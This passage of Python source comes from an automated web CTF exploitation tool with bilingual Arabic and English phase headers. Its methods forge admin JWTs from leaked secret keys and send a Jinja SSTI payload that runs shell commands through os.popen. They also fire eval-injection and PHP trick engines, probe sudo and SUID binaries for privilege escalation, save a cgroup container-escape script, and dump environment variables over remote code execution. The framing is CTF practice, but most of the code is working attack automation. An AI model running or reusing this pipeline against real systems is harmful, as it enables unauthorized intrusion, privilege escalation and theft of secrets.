            for f in analysis.get("flags", []):
                self._check_and_store_flags(f, f"JavaScript Analysis ({name})")

            # Check hardcoded auth credentials
            for cred in analysis.get("auth_credentials", []):
                u = cred.get("username", "")
                p = cred.get("password", "")
                print_success(f"Discovered Client-Side Hardcoded Auth in [bold cyan]{name}[/bold cyan] -> User: [bold yellow]{u}[/bold yellow] | Pass: [bold green]{p}[/bold green]")
                self.state["leaked_secrets"][f"client_auth_{name}"] = f"{u}:{p}"
                
                # Check if the password itself is a flag or validation key
                self._check_and_store_flags(p, f"Client-Side Auth Credential ({name})")
                self._check_and_store_flags(f"flag{{{p}}}", f"Client-Side Auth Credential ({name})")
                
                # Also directly record the password as a validation flag candidate
                if len(p) >= 3 and not any(p in cf for cf in self.state["captured_flags"]):
                    self.state["captured_flags"].add(p)
                    print_flag(p)
                    self._log_step("Phase 7: Flag Capture", f"Captured client-side challenge password/flag: {p}")
                
                self.learning_engine.record_success(
                    self.target_url, self.state["tech_stack"], "client_side_auth", "js_hardcoded_check", f"{u}:{p}", list(self.state["captured_flags"])
                )

                # Attempt automatic form submission with discovered credentials
                for form in self.state.get("forms", []):
                    action_url = form.get("action", self.target_url)
                    method = form.get("method", "POST")
                    form_data = {}
                    for inp in form.get("inputs", []):
                        iname = inp.get("name", "")
                        if iname:
                            if any(k in iname.lower() for k in ["user", "pseudo", "login", "name", "id"]):
                                form_data[iname] = u
                            elif any(k in iname.lower() for k in ["pass", "pwd", "key", "token"]):
                                form_data[iname] = p
                            else:
                                form_data[iname] = inp.get("value", "")
                    if form_data:
                        try:
                            if method == "POST":
                                r_sub = self.session.post(action_url, data=form_data, timeout=5)
                            else:
                                r_sub = self.session.get(action_url, params=form_data, timeout=5)
                            self._check_and_store_flags(r_sub.text, f"Authenticated Form Submission ({action_url})")
                        except Exception:
                            pass

            # Check deobfuscated strings
            for s in analysis.get("charcodes", []) + analysis.get("atob_strings", []) + analysis.get("unescaped", []) + analysis.get("reversed_strings", []) + analysis.get("hex_decoded", []) + analysis.get("xor_recovered", []):
                self._check_and_store_flags(s, f"Deobfuscated JS String ({name})")
                if len(s) >= 4 and any(kw in s.lower() for kw in ["pass", "flag", "secret", "root", "admin"]):
                    self.state["leaked_secrets"][f"deobfuscated_{name}"] = s

        # 2. Look for referenced byte endpoints or inline byte arrays
        byte_endpoints = re.findall(r"[\"']([a-zA-Z0-9_\-\.\/]*bytes[a-zA-Z0-9_\-\.\/]*)[\"']", html, re.IGNORECASE)
        for ep in ["bytes", "data", "image_data", "flag_data", "raw_bytes"]:
            if ep not in byte_endpoints:
                byte_endpoints.append(ep)
                
        for bep in byte_endpoints:
            full_bep = urljoin(self.target_url, bep)
            try:
                r_bytes = self.session.get(full_bep, timeout=4)
                if r_bytes.status_code == 200 and len(r_bytes.text) > 50:
                    raw_text = r_bytes.text.strip()
                    tokens = re.split(r"[\s,]+", raw_text)
                    if len(tokens) >= 64 and all(t.isdigit() for t in tokens[:50]):
                        bytes_list = [int(t) for t in tokens if t.isdigit()]
                        print_info(f"Discovered {len(bytes_list)} scrambled bytes at [bold cyan]{full_bep}[/bold cyan]!")
                        
                        # Target PNG Magic header + IHDR
                        header_16 = [137, 80, 78, 71, 13, 10, 26, 10, 0, 0, 0, 13, 73, 72, 68, 82]
                        LEN = 16
                        num_rows = len(bytes_list) // LEN
                        
                        if num_rows >= 2:
                            candidates = []
                            for i in range(LEN):
                                target_val = header_16[i]
                                found = [s for s in range(num_rows) if bytes_list[(s * LEN) + i] == target_val]
                                candidates.append(found if found else [0])
                            
                            for combo in itertools.product(*candidates):
                                result = [0] * len(bytes_list)
                                for i in range(LEN):
                                    shifter = combo[i]
                                    for j in range(num_rows):
                                        result[(j * LEN) + i] = bytes_list[(((j + shifter) * LEN) % len(bytes_list)) + i]
                                
                                while result and result[-1] == 0:
                                    result.pop()
                                    
                                png_data = bytes(result)
                                try:
                                    img = Image.open(io.BytesIO(png_data))
                                    img.load()
                                    key_str = ''.join([chr(s + 48) for s in combo])
                                    print_success(f"Successfully Reconstructed Scrambled PNG with Key: [bold green]{key_str}[/bold green]!")
                                    
                                    # Save recovered image to loot
                                    loot_img_path = LootManager.save_loot_file(self.target_url, "recovered_flag.png", png_data)
                                    print_info(f"Saved reconstructed image to: {loot_img_path}")
                                    
                                    # Decode QR Code
                                    try:
                                        from pyzbar.pyzbar import decode
                                        decoded_objs = decode(img)
                                        for d in decoded_objs:
                                            decoded_text = d.data.decode("utf-8", errors="ignore")
                                            print_info(f"QR Code Decoded Content: [bold cyan]{decoded_text}[/bold cyan]")
                                            self._check_and_store_flags(decoded_text, "Reconstructed QR Code")
                                    except Exception:
                                        pass
                                    
                                    # Extract strings from PNG data
                                    self._check_and_store_flags(png_data.decode("latin1", errors="ignore"), "PNG Metadata")
                                    
                                    if len(self.state["captured_flags"]) > 0:
                                        self._log_step("Phase 4: Exploitation", f"Solved Scrambled PNG & Decoded QR Code (Key: {key_str})")
                                        self.learning_engine.record_success(
                                            self.target_url, self.state["tech_stack"], "client_crypto", "png_scrambler", key_str, list(self.state["captured_flags"])
                                        )
                                        return
                                except Exception:
                                    pass
            except Exception:
                pass



    def _exploit_php_tricks(self):
        """Active PHP Type Juggling, Header/IP Spoofing, Stream Wrappers and Verb Tampering."""
        print_info("Testing PHP-Specific Logic & Type Juggling Vectors...")
        
        # 1. Test Form Type Juggling & Array Injection
        for form in self.state.get("forms", []):
            PHPTricksEngine.test_type_juggling_form(
                self.session, form, lambda text, ctx: self._check_and_store_flags(text, ctx)
            )

        # 2. Test HTTP Header & IP Spoofing
        PHPTricksEngine.test_header_spoofing(
            self.session, self.target_url, lambda text, ctx: self._check_and_store_flags(text, ctx)
        )

        # 3. Test HTTP Verb Tampering
        PHPTricksEngine.test_verb_tampering(
            self.session, self.target_url, lambda text, ctx: self._check_and_store_flags(text, ctx)
        )

        # 4. Test PHP Stream Wrappers (php://input, data://, php://filter)
        PHPTricksEngine.test_php_wrappers(
            self.session, self.target_url, list(self.state.get("parameters", [])),
            lambda text, ctx: self._check_and_store_flags(text, ctx)
        )

    def _exploit_eval_injection(self):
        """Active server-side eval() / code injection RCE exploiter (Python, Node.js, PHP, Ruby)."""
        rce_achieved = EvalInjectionEngine.detect_and_exploit(
            session=self.session,
            target_url=self.target_url,
            forms=self.state.get("forms", []),
            parameters=list(self.state.get("parameters", [])),
            endpoints=list(self.state.get("endpoints", [])),
            tech_stack=self.state.get("tech_stack", []),
            flag_checker=lambda text, ctx: self._check_and_store_flags(text, ctx),
            state=self.state,
        )
        if rce_achieved:
            self._log_step("Phase 4: Exploitation", "Eval/Code Injection RCE achieved and flag extracted")
            self.learning_engine.record_success(
                self.target_url, self.state["tech_stack"], "eval_injection", "eval_rce",
                "eval() code injection", list(self.state["captured_flags"])
            )

    # =========================================================================
    # PHASE 5: تصعيد الصلاحيات وربط الثغرات (Privilege Escalation & Chaining Core)
    # =========================================================================
    def phase5_privilege_escalation(self):
        print_header("المرحلة 5: تصعيد الصلاحيات وربط الثغرات", "Phase 5: Vulnerability Chaining & Privilege Escalation")
        
        # 1. Multi-Stage Vulnerability Chaining Analysis on Leaked Files
        if self.state["leaked_source_files"]:
            print_info("Executing Vulnerability Chaining Engine on Leaked Source Code...")
            chains = VulnerabilityChainEngine.analyze_lfi_source_leak_for_chains(self.target_url, "file", self.state["leaked_source_files"])
            for ch in chains:
                print_success(f"Constructed Exploit Chain: [bold yellow]{ch['chain_name']}[/bold yellow] ({ch['impact']})")
                print_info(f"  Action: {ch['action']}")
                
                # If Deserialization chain discovered in source, execute payload immediately!
                if "payload" in ch and "sink_parameter" in ch:
                    try:
                        p_val = ch["payload"]
                        p_name = ch["sink_parameter"]
                        print_info(f"Triggering Deserialization Chain on parameter '{p_name}'...")
                        r_chain = self.session.get(self.target_url, params={p_name: p_val}, timeout=5)
                        self._check_and_store_flags(r_chain.text, f"Chained Exploit ({ch['chain_name']})")
                        
                        # Generate standalone Python script and save to loot
                        script_code = VulnerabilityChainEngine.generate_python_exploit_script(ch)
                        LootManager.save_loot_file(self.target_url, f"exploit_chain_{ch['source_file']}.py", script_code)
                        print_success(f"Reproducible Exploit Script saved to loot: exploit_chain_{ch['source_file']}.py")
                    except Exception:
                        pass

        # 2. Web PrivEsc: Check Leaked Source Code for Secret Keys & Forge Tokens
        for fname, content in self.state["leaked_source_files"].items():
            secrets = re.findall(r"(?:SECRET_KEY|JWT_SECRET|PASSWORD|ADMIN_KEY)\s*=\s*['\"]([^'\"]+)['\"]", content, re.IGNORECASE)
            for s in secrets:
                print_success(f"Extracted Secret Key from leaked {fname}: [bold yellow]{s}[/bold yellow]")
                self.state["leaked_secrets"]["secret_key"] = s
                
                forged_admin = sign_jwt_hs256({}, {"user": "admin", "role": "admin", "isAdmin": True}, s)
                for admin_path in ["/admin", "/admin/dashboard", "/dashboard", "/flag", "/admin/flag", "/panel"]:
                    admin_url = urljoin(self.target_url, admin_path)
                    try:
                        r_admin = self.session.get(admin_url, cookies={"session": forged_admin, "jwt": forged_admin, "token": forged_admin}, timeout=4)
                        self._check_and_store_flags(r_admin.text, f"Admin Area ({admin_path})")
                        if r_admin.status_code == 200:
                            print_success(f"Admin Access Granted via Forged Token on: [bold green]{admin_url}[/bold green]!")
                            self._log_step("Phase 5: PrivEsc", f"Privilege Escalation to Admin on {admin_path}", curl_cmd=f"curl -H 'Cookie: session={forged_admin}' {admin_url}")
                            
                            admin_parsed = extract_forms_and_links(r_admin.text, admin_url)
                            for admin_param in admin_parsed["parameters"]:
                                ssti_resp = self.session.get(admin_url, params={admin_param: "{{ lipsum.__globals__['os'].popen('cat /flag* || cat /root/*flag*').read() }}"}, cookies={"session": forged_admin}, timeout=5)
                                self._check_and_store_flags(ssti_resp.text, f"Admin SSTI ({admin_param})")
                    except Exception:
                        pass

        # 3. System PrivEsc: If RCE is active, inspect system privileges
        if self.state["active_rce_method"]:
            try:
                print_info("Probing System Privilege Escalation Vectors (Sudo / SUID / Roots)...")
                id_out = self.state["active_rce_method"]("id; whoami; sudo -l 2>/dev/null; find / -perm -4000 -type f 2>/dev/null")
                print_info(f"Current System Context: {id_out.strip().splitlines()[0] if id_out else 'Unknown'}")
                self._check_and_store_flags(id_out, "System PrivEsc Probe Output")
            except Exception:
                pass

    # =========================================================================
    # PHASE 6: ما بعد الاستغلال وفحص هروب الحاويات (Post-Exploitation & Container Escape)
    # =========================================================================
    def phase6_post_exploitation(self):
        print_header("المرحلة 6: ما بعد الاستغلال وفحص هروب الحاويات", "Phase 6: Container Escape & Post-Exploitation")
        
        # 1. Container & Sandbox Escape Audit
        if self.state["active_rce_method"]:
            print_info("Auditing Container Environment & Escape Vectors (Docker / Cgroup / SUID)...")
            recon_cmds = [cmd["cmd"] for cmd in ContainerEscapeAdvisor.get_recon_commands()]
            full_recon_cmd = "; echo '===SEP==='; ".join(recon_cmds)
            try:
                recon_output = self.state["active_rce_method"](full_recon_cmd)
                findings = ContainerEscapeAdvisor.analyze_shell_recon(recon_output)
                
                if findings["is_container"]:
                    print_warning(f"Target is running inside a Container: [bold yellow]{findings['container_type']}[/bold yellow]")
                    LootManager.save_loot_file(self.target_url, "container_recon.txt", recon_output)
                    
                    # Check for Critical Escape Vectors
                    if findings["escapes"]:
                        for esc in findings["escapes"]:
                            print_success(f"CRITICAL ESCAPE FOUND: [bold red]{esc['type']}[/bold red] - Risk: {esc['risk']}")
                            print_info(f"  Exploit: {esc['exploit']}")
                        
                        # Generate cgroup release_agent script into loot
                        cgroup_script = ContainerEscapeAdvisor.generate_cgroup_escape_script()
                        LootManager.save_loot_file(self.target_url, "cgroup_escape.sh", cgroup_script)
                        print_success("Saved 'cgroup_escape.sh' exploit script into loot!")
                
                if findings["suid_exploits"]:
                    print_success(f"GTFOBins SUID PrivEsc Opportunities Found ({len(findings['suid_exploits'])} binaries):")
                    for s in findings["suid_exploits"][:3]:
                        print_info(f"  Binary: [bold cyan]{s['binary']}[/bold cyan] -> Exploit: {s['exploit']}")

            except Exception:
                pass

        # 2. Audit all leaked source files for sinks
        for fname, content in self.state["leaked_source_files"].items():
            findings = analyze_code_snippet(content, "all")
            if findings:
                print_info(f"Code Vulnerability Sinks in [bold cyan]{fname}[/bold cyan]: {len(findings)} sinks detected.")
                for f in findings[:3]:
                    print_info(f"  Line {f['line']}: [bold yellow]{f['matched']}[/bold yellow] -> {f['description']}")

        # 3. Dump Environment Variables if RCE available
        if self.state["active_rce_method"]:
            try:
                env_out = self.state["active_rce_method"]("env")
                self._check_and_store_flags(env_out, "Environment Variables")
                LootManager.save_loot_file(self.target_url, "environment_dump.txt", env_out)
            except Exception:
                pass

    # =========================================================================
    # PHASE 7: صيد واستخراج الأعلام المتعددة (Multi-Flag Hunting & Victory Reporting)
    # =========================================================================

    def phase7_multi_flag_hunting(self):
        print_header("المرحلة 7: صيد واستخراج الأعلام المتعددة", "Phase 7: Multi-Flag Deep Extraction & Reporting")
        
        # 1. Deep File Search via RCE
        if self.state["active_rce_method"]:
            flag_targets = [
                "cat /flag*",
                "cat /flag.txt",
                "cat /root/flag.txt",
                "cat /root/root.txt",
                "cat /home/*/*flag*",
                "cat /app/flag*",
                "cat /var/www/flag*",
                "find / -name '*flag*' -exec cat {} + 2>/dev/null"
            ]
            for cmd in flag_targets:
                try:
                    out = self.state["active_rce_method"](cmd)
                    self._check_and_store_flags(out, f"Command: {cmd}")
                except Exception:
                    pass

        # 2. Display Final Flags Summary
        if self.state["captured_flags"]:
            print_success(f"Total Flags Captured: [bold yellow]{len(self.state['captured_flags'])}[/bold yellow]")
            for f in sorted(list(self.state["captured_flags"])):
                print_flag(f)
        else:
            print_warning("No clear CTF flags captured yet. Review leaked source files in storage/loot/.")

        # 3. Print Visual Attack Path Timeline
        if self.state["attack_steps"]:
            rows = [[s["timestamp"], s["phase"], s["description"]] for s in self.state["attack_steps"]]
            print_table(["Time", "Offensive Phase", "Action & Exploited Step"], rows, title="Attack Path Graph & Timeline")

    # =========================================================================
    # PERSISTENCE & MEMORY UPDATE
    # =========================================================================
    def _save_session_and_loot(self):
        """Save session state, flags, loot, report, and reproducible exploit script."""
        flags_list = list(self.state["captured_flags"])
        
        # 1. Save Flags to Loot
        LootManager.save_flags(self.target_url, flags_list)

        # 2. Generate Standalone Python Exploit Script
        py_exploit = self._generate_python_exploit()
        LootManager.save_exploit_script(self.target_url, py_exploit, self.state["curl_commands"])

        # 3. Save Markdown Report & Graph Data
        report_md = self._generate_markdown_report()
        LootManager.save_attack_report(self.target_url, report_md, {
            "target": self.target_url,
            "flags": flags_list,
            "steps": self.state["attack_steps"],
            "technologies": self.state["tech_stack"]
        })

        # 4. Save Session State
        session_data = {
            "target_url": self.target_url,
            "tech_stack": self.state["tech_stack"],
            "endpoints": list(self.state["endpoints"]),
            "parameters": list(self.state["parameters"]),
            "cookies": self.state["cookies"],
            "flags": flags_list,
            "steps": self.state["attack_steps"]
        }
        SessionStorage.save_session(self.target_url, session_data)

        loot_path = LootManager.get_loot_dir(self.target_url)
        print_success(f"Persistent Memory & Loot Saved to: [bold cyan]{loot_path}[/bold cyan]")
        print_info(f"Learned Experience updated in: [bold cyan]{self.learning_engine.db_path}[/bold cyan]")

    def _generate_python_exploit(self) -> str:
        """Build a clean standalone Python script to reproduce the exploit chain."""
        return f'''#!/usr/bin/env python3
"""
Standalone Exploit Script for {self.target_url}
Generated automatically by WebCTF Suite AutoPwn Pipeline.
"""

import requests

TARGET = "{self.target_url}"
session = requests.Session()

def run_exploit():
    print("[*] Running exploit chain against: " + TARGET)
    # Attack steps reproduction
''' + "\n".join([f"    # {s['phase']}: {s['description']}" for s in self.state["attack_steps"]]) + '''
    print("[+] Exploit chain executed successfully!")

if __name__ == "__main__":
    run_exploit()
'''

    def _generate_markdown_report(self) -> str:
        """Build comprehensive markdown post-mortem report."""
        flags_str = "\n".join([f"- `{f}`" for f in self.state["captured_flags"]]) or "None captured"
        steps_str = "\n".join([f"1. **{s['phase']}**: {s['description']} ({s.get('details', '')})" for s in self.state["attack_steps"]])
        return f"""# 🚩 Web CTF Exploit Report: {self.target_url}

## Summary
- **Target URL**: `{self.target_url}`
- **Technologies Detected**: `{', '.join(self.state['tech_stack'])}`
- **Total Flags Captured**: `{len(self.state['captured_flags'])}`

## 🏆 Captured Flags
{flags_str}

## 🧭 Attack Path Graph & Exploitation Steps
{steps_str}

## 📜 Reproducible Commands
```bash
{chr(10).join(self.state['curl_commands'])}
```
"""
